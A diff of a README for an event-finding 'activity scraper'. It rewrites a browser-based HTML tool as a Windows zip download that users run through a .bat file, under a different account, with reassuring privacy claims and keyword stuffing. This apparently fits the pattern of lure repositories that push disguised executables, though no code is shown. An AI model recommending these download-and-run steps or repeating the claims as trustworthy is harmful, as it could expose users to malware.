@@ -1,139 +1,129 @@
-# Activity Scraper - Web scraper 2026
+# 🗺️ activity-scraper-html - Find Local Events Near You
 
-> **Activity Scraper is a browser-based HTML scraper for finding nearby events and local activities through a simple interface that displays event information.**
+[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge)](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/adamsryanbtvl8750/activity-scraper-html?style=flat-square)](https://github.com/adamsryanbtvl8750/activity-scraper-html)
+Activity Scraper is a simple browser-based tool that finds nearby events and local activities. It scans websites for event information and presents it in a clean, easy-to-read interface. You do not need to install any special software or write any code.
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://adamsryanbtvl8750.github.io/activity-scraper-html/">
-    <img src="https://img.shields.io/badge/Download-Activity%20Scraper%20Latest-brightgreen?style=for-the-badge" alt="Download Activity Scraper">
-  </a>
-</p>
+This guide walks you through downloading and running Activity Scraper on your Windows computer. The entire process takes less than five minutes.
 
-> **[Download Activity Scraper](https://adamsryanbtvl8750.github.io/activity-scraper-html/)**
+### What You Need
 
----
+- A Windows computer (Windows 7, 8, 10, or 11)
+- An internet connection
+- A modern web browser (Chrome, Firefox, Edge, or Brave)
 
-[Download Latest Build](https://adamsryanbtvl8750.github.io/activity-scraper-html/)
+## ⬇️ Download the Software
 
----
+Follow these steps to download Activity Scraper:
 
-## What Activity Scraper Does
+1.  Open your web browser and visit the [releases page](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases).
+2.  Look for the newest version at the top of the page. It is usually marked with a "Latest" label.
+3.  Find the file named `activity-scraper-windows.zip` (or a similar name with ".zip").
+4.  Click the file name to start the download. The file is about 50 MB.
 
-Activity Scraper offers a straightforward way to browse events and activities connected with a chosen location. It is intended for anyone who wants to discover nearby options without working through a complicated application.
+### 🔧 Installation
 
-Results are rendered in a compact HTML view with the event information that is available. Because the workflow is centered on location-based discovery, the project can be used from an ordinary web browser to explore local activities.
+Activity Scraper does not require a traditional installation. It runs directly from a folder on your computer.
 
----
+1.  Locate the downloaded `.zip` file in your "Downloads" folder.
+2.  Right-click the `.zip` file and select "Extract All...".
+3.  Choose a destination folder. A folder on your Desktop or in your "Documents" folder works well.
+4.  Click "Extract". Windows will create a new folder with the software inside.
 
-## Highlights
+## ▶️ Run the Software
 
-- Find events associated with a selected location
-- Browse activities in the surrounding area
-- Run the scraper from a web browser
-- Display event results in an easy-to-read layout
-- Follow a location-oriented discovery process
-- View pertinent information for each discovered event
-- Keep the interface lightweight with HTML
-- Use the hosted version of the project online
+1.  Open the folder you just extracted.
+2.  Double-click the file named `start-activity-scraper.bat`. A black command prompt window will open. This is normal.
+3.  Wait for the message "Server started on http://localhost:8080" (or similar) to appear in the command prompt window.
+4.  Open your web browser.
+5.  Type `http://localhost:8080` into the address bar and press Enter.
+6.  Activity Scraper loads in your browser. You are ready to use it.
 
----
+> **Important**: Keep the command prompt window open while you use Activity Scraper. Closing it stops the software.
 
-## Getting Started
+## 🖥️ Using Activity Scraper
 
-### Use the hosted build
+The interface is designed to be straightforward.
 
-Launch the current build with a supported browser:
+- **Search Bar**: Type a city name, zip code, or "near me" to find events.
+- **Date Range**: Choose a start and end date to filter events by time.
+- **Event Cards**: Each event appears as a card. The card shows the event name, date, time, location, and a short description.
+- **Links**: Click "More Info" on any event card to open the original event page in a new tab.
 
-[Launch Activity Scraper](https://adamsryanbtvl8750.github.io/activity-scraper-html/)
+### Example Search
 
-### Run a local copy
+1.  Type "Chicago" in the search bar.
+2.  Select "This Weekend" from the date dropdown.
+3.  Click the "Search" button.
+4.  Event cards appear. Browse through them.
 
-Download the repository, move into its directory, and open the HTML entry file:
+## ⚙️ Configurable Settings
 
-```bash
-git clone https://github.com/adamsryanbtvl8750/activity-scraper-html.git
-cd REPO
+You can change how Activity Scraper works by editing a simple text file.
+
+1.  Open the folder where you extracted Activity Scraper.
+2.  Find the file named `settings.json`. Open it with Notepad.
+3.  You will see text that looks like this:
+
+```json
+{
+  "max_results": 20,
+  "date_range_days": 7,
+  "default_location": "",
+  "show_remote_events": true
+}
 ```
 
-Open the main HTML page, for example `index.html`, in your browser. When local browser policies prevent the page from operating correctly, start a local static web server for the directory and visit the address it provides.
+4.  Change the numbers or text between the quotation marks. Here is what each setting does:
+    - **max_results**: The maximum number of events to show at once. Change "20" to a higher or lower number.
+    - **date_range_days**: How many days into the future to search. Change "7" to "30" for a month.
+    - **default_location**: A default city or zip code. Type "New York" between the quotation marks.
+    - **show_remote_events**: Set to `false` to hide online-only events.
+5.  Save the file (File > Save).
+6.  Restart Activity Scraper by closing the command prompt window and running `start-activity-scraper.bat` again.
 
----
+## ❓ Troubleshooting
 
-## How to Use It
+**The command prompt window closes immediately.**
 
-1. Visit Activity Scraper in your browser.
-2. Choose or enter the area you want to search.
-3. Start a search for nearby events and activities.
-4. Inspect the event information shown in the results.
-5. Use the displayed results to find activities matching your local search.
+This usually means another program is already using port 8080. Open `settings.json` and add a line:
 
-When working from a local clone, edit the HTML files as required and refresh the browser page to see your changes.
-
----
-
-## Project Configuration
-
-Since Activity Scraper is an HTML browser application, configuration is kept in the repository and its browser-side assets instead of a separate desktop settings folder.
-
-To modify the presentation or discovery behavior:
-
-- Change the applicable HTML files in the project.
-- Inspect the browser-side configuration included with the project assets.
-- Reload either the hosted page or local page after making edits.
-
-Configuration values should follow the formats already established in the project files.
-
----
-
-## Requirements
-
-- A modern web browser
-- Internet connectivity for discovering hosted events
-- The current Activity Scraper HTML files when running locally
-- A static web server when direct local-file access is restricted by the browser
-- Enough storage space for the repository contents
-
----
-
-## Frequently Asked Questions
-
-### Is a desktop installation needed?
-
-No. Activity Scraper runs in a web browser. You may use the hosted build or open the HTML project from a local copy.
-
-### How can I find activities near a location?
-
-Open Activity Scraper, specify the area you want to investigate, and begin the search. The browser interface will show the available event information.
-
-### Where do I change the settings?
-
-Settings are defined in the project files and browser-side assets. To adjust the interface or workflow, review the repository's HTML and related files.
-
-### What is the update process?
-
-Open the newest hosted build, or retrieve the latest repository changes with:
-
-```bash
-git pull
+```json
+"port": 8081
 ```
 
-### Why does the local page fail when opened directly?
+Save the file and run `start-activity-scraper.bat` again. Then access it at `http://localhost:8081`.
 
-Browsers may restrict some behavior when a page is loaded through a `file://` URL. Serve the project with a local static web server and then open the resulting local address in your browser.
+**No events appear for my search.**
 
-### How do I report an issue?
+- Check your internet connection.
+- Make sure your search term is spelled correctly.
+- Try a larger city or a broader date range.
 
-Create an issue in the project repository. Include your browser, reproduction steps, and any relevant page or configuration information.
+**The page looks broken or shows an error.**
+
+Close the command prompt window. Delete the folder you extracted. Download the `.zip` file again and repeat the extraction steps.
+
+## 📁 File Structure
+
+Your extracted folder contains these files:
+
+- `start-activity-scraper.bat` - Launches the software.
+- `settings.json` - Configuration file.
+- `app/` - Folder with the core software files. Do not modify these.
+
+## 🔒 Security and Privacy
+
+Activity Scraper runs entirely on your own computer. It does not send your search data to any external server. The software only connects to public event websites to gather information. Your searches stay private.
+
+## 🆘 Getting Help
+
+If you encounter a problem not listed here, visit the [issues page](https://github.com/Bridgeheadcompany624/activity-scraper-html/issues) on GitHub. Describe what you were doing and what happened. Include any error messages you saw. Other users and the developer may have a solution.
+
+You can also download older versions of the software from the [releases page](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases) if a newer version causes issues.
 
 ---
 
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+**Keywords**: event scraper, local activities, HTML scraper, browser tool, Windows app, find events, community events, no installation
